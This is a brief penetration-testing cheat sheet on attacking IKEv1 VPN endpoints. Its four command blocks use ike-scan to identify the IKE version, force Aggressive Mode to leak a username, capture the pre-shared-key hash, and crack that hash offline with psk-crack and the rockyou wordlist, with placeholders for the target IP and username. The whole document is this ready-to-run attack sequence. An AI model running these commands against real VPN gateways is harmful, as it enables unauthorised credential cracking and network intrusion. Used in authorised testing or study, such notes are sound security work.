# ISAKMP/IKE 
**on UDP most of the time - VPN protocols, Try break it using Aggressive mode and crack password offline. Works on IKEv1. IKEv2 will not work most probably.**

### For identificate IKE version, force a handshake and grab a hash use `ike-scan `
``` bash
sudo ike-scan [TARGET-IP] 
```

##### Forcing Aggressive Mode for an Identity Leak
```bash
sudo ike-scan -A [TARGET-IP]
```

#### Capturing and cracking the PSK Hash
```bash
ike-scan --aggressive --id=[USERNAME-FROM-STEP-ABOVE] [TARGET-IP] --pskcrack=ike_hash.txt
```

```bash
psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
```
